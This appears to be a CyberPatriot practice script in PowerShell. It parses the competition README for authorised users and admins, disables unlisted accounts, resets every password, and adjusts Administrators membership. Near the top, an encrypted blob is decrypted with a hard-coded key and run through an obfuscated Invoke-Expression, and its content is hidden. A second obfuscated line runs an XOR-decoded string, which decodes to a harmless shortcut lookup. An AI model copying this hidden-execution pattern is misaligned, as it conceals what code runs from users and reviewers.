

$output_u = "$env:USERPROFILE\Desktop\ScriptOut\Users"
mkdir $output_u -ErrorAction SilentlyContinue
Start-Transcript -Path "$output_u\users_log.log"

(New-object Management.Automation.Pscredential  ' ', ( '76492d1116743f0423413b16050a5345MgB8ACsAVgBSAHEANABzAG8AagBQAGMANgB3AGkAaABaADcAYgBjAFcAYQBJAGcAPQA9AHwAZgBlADIANwA0AGYANwAxADcANQAxADcAOQA1AGUANgAzADIAZgAzAGEANQA0ADMAMAAxAGEAYQBkAGIAMgAxAGQAYgA3ADMAOAA4ADIANAAzADIANgAwAGYANgA2ADQAYQAzAGQAZQA4ADIAZQAxADEAMQBiADUAOQBhADQAZgA5ADcANQA5ADgANwBmADUAMwBkAGEAMwBiAGEAYwAzADQAMwAwADgAZABjADUAYQBmADMAMwAyADAAMQA5ADUAYwA3ADMAMwBjAGUAOQAzAGMANgAyAGEAMQAwAGMAMwA3AGYAOAAwADYAOAA2ADcAMAA0AGIAZAAzADYAMQBmADEAMQBiADkAZgAwADUAMAAxAGQANgA1ADkAYQBiADIAYQA5AGMAOAA2AGIAMAA3ADAAMABlADQANQBjADMAZAAyAGQAZQA4ADEANwAxAGEAZQBmADIAMwBkADAANwA5AGYANgA0AGMAMwBjADUANQBlADkAZgA4ADAAMwA4AGMAZQA3ADAAZAA0ADAAYwBhADcANgAzAGEAZABkAGMANQBhADQAZAA5AGYAZQBkAGYAZAA1AGEAYgA2AGQAOQBhADgANQBkADUAZQA0ADYAYQBkAGQAMgAxADIAMAA4AGQANwBlAGEANQAwADUAOQAyADEANQA4AGIAYQAxADQAZgBmADUAMgBjADQAMwAxADIAZQBiAGYAMwAwADcAYwBkADUAMQA3ADQAZgBhAGEAZQAyAGEAOAA2ADYAMgBmADkAYwBkAGUAZABjADEAMQAzADQAYwA4AGMAMgA1AGUAMgA0AGYAMgA2ADUAZQAxADkAMwBiADUAMQBiADcAYwBmADIAOAA2AGEAOQBmADYAMwBkADQAOQAyADEAMgA0AGUAOQA4ADQAMABmADUAYwAxADIAYgA2AGQAMABmAGEANgA=' | Convertto-securestring -K  (150..165) ) ).networkCredential().password | & ( $env:comspec[4,15,25]-join'')

$sh = New-Object -ComObject WScript.Shell
[sTring]::join('', ([cHAR[]]( 107 , 58 , 61, 35 , 111,114 , 111 ,107, 60,39 ,97,12,61, 42 , 46,59 ,42 , 28,39 , 32 ,61, 59,44 ,58 , 59 , 103 ,104,12 ,117,19 ,12 , 54, 45 ,42,61 ,31,46, 59,61 ,38 ,32, 59 , 19 , 29 ,10 , 14, 11 ,2,10 ,97 , 58 ,61 , 35, 104 , 102 ,97,27 , 46 ,61 ,40 ,42, 59 , 31 ,46,59,39) |% {[cHAR] ($_-BXor 0x4F ) } ))|iEx
$url | Out-File -FilePath $output_u\url.txt
if (!$url) {
    $url = $sh.CreateShortcut("$env:USERPROFILE\Desktop\CyberPatriot README.url").TargetPath
    if (!$url) {
        $target = $sh.CreateShortcut("$env:USERPROFILE\Desktop\CyberPatriot README.lnk").TargetPath
        try {
            $url = $sh.CreateShortcut($target).TargetPath
        } catch {
            $url = $sh.CreateShortcut("$env:USERPROFILE\Desktop\CyberPatriot README.lnk").TargetPath
        }
    }
}
try {
    $HTML = Invoke-WebRequest -Uri $url -UseBasicParsing
} catch {
    Write-Host "HTML retrieval error, please do manually"
    pause
    start \\vmware-host\"Shared Folders"\shared\adusersold.bat
    Stop-Transcript
    exit
}
$regex = "(?smi)<pre>.*Administrators:<\/b>(.*?$.+?)<\/pre>.*?"
$matches = $HTML.RawContent | select-string -AllMatches $regex
if (!$matches) {
    Write-Host "Parsing error, please do manually"
    pause
    exit
}
$match = New-Object Collections.Generic.List[string]
foreach($m in $matches.Matches) {
    $match.Add($m)
}
$matchlist = $match[0].Split("`r`n")
$items = New-Object Collections.Generic.List[string]
foreach($item in $matchlist) {
    if ($item -like "*Authorized Users*" -or ($item -notlike "*<pre>*" -and $item -notlike "*</pre>*" -and $item -notlike "*Authorized Admin*" -and $item -notlike "*password*" -and $item -notmatch "[\\/`"[\]:|<>+=;,?*@]" -and $item)) {
        $items.Add($item.Trim())
    }
}
$items[0] = $items[0].Split(" ")[0]
$standards = New-Object Collections.Generic.List[string]
$admins = New-Object Collections.Generic.List[string]
$users = New-Object Collections.Generic.List[string]
$admincheck = $true
foreach($user in $items) {
    if ($user -notlike "*Authorized Users:*") {
        if ($admincheck) {
            $admins.Add($user)
        }
        else {
            $standards.Add($user)
        }
        $users.Add($user)
    } else {
        $admincheck = $false
    }
}
$myusers = New-Object Collections.Generic.List[string]
$myusersresult = Get-LocalUser | Select Name
foreach ($user in $myusersresult) {
    $myusers.Add($user.Name)
}

Write-Host "What was parsed:"
Write-Host "Admins:" $admins "(Total: $($admins.Count))" -ForegroundColor Red
Write-Host "Standards:" $standards "(Total: $($standards.Count))" -ForegroundColor Yellow
$confirm = Read-Host "Continue with this user configuration? [Y/N] (Default: Y)"
if ($confirm -eq "N") {
    Write-Host "Using legacy script..."
    start \\vmware-host\"Shared Folders"\shared\users.bat
    Stop-Transcript
    exit
}

$pass = Read-Host -Prompt "Enter the password you will use" -AsSecureString
$myusers | Enable-LocalUser
$difference = diff $users $myusers -CaseSensitive
foreach ($r in $difference) {
    if ($r.SideIndicator -eq "<=") {
        Write-Host "User $r has been recognized as a to-be-added user. Double-check and configure this user manually." -ForegroundColor Cyan
    }
    elseif ($r.SideIndicator -eq "=>") {
        Disable-LocalUser -Name $r.InputObject
        Write-Host $r "has been disabled" -ForegroundColor Red
    }
}
$myusers | Set-LocalUser -Password $pass -PasswordNeverExpires $false -UserMayChangePassword $true

Add-LocalGroupMember -SID "S-1-5-32-544" -Member $admins -ErrorAction SilentlyContinue
Remove-LocalGroupMember -SID "S-1-5-32-544" -Member $standards -ErrorAction SilentlyContinue

Stop-Transcript
Write-Host "User configuration complete. Make sure to check other groups." -ForegroundColor Green
pause